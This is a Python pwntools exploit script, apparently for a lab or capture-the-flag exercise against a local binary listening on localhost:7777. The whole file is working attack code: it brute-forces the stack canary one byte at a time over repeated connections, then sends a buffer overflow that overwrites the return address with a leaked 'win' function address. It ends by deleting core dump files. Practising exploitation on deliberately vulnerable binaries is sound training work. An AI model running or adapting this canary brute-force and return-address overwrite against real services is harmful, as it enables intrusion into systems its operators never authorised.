from pwn import *


binary = "../x86_binaries/x86_static"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break *handle_client+82
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p_server = elf.process()
    print(f"Server PID: {p_server.pid}")
    sleep(0.3)                              # wait for server to start
else:
    p_server = elf.process()
    sleep(0.3)                              # wait for server to start



### EXPLOIT ###
canary = b''
last_byte = 0

while len(canary) != 8:
    # spawn another instance
    p = remote("localhost", 7777)

    payload = flat(
        b'a'*0x28,
        canary,
        int.to_bytes(last_byte)
    )
    p.send(payload)

    # see if the byte was correct or not
    try:
        if p.recvuntil(b'Goodbye!', timeout=0.05) == b"":
            raise EOFError()
        canary += int.to_bytes(last_byte)
        print(f'Canary so far: {canary.hex()}')
        last_byte = 0
    except EOFError:
        last_byte += 1
        if last_byte > 0xff:
            print("Couldn't find byte :(")
            exit(1)
    
    # close
    p.close()

### RET2WIN ###
p = remote("localhost", 7777)

# get leak
win_addr = int(p.readline().strip(),16)

if args.GDB:
    # do "echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope" if gdb attach fails
    gdb.attach(p, gdbscript=gs)

payload = flat(
    b'a'*0x28,
    canary,
    p64(0),                             # rbp
    p64(win_addr+1)                     # +1 to pass stack alignment in system() function
)
p.sendline(payload)
p.interactive()


### CLEANUP ###
p_server.close()
os.system("rm core*")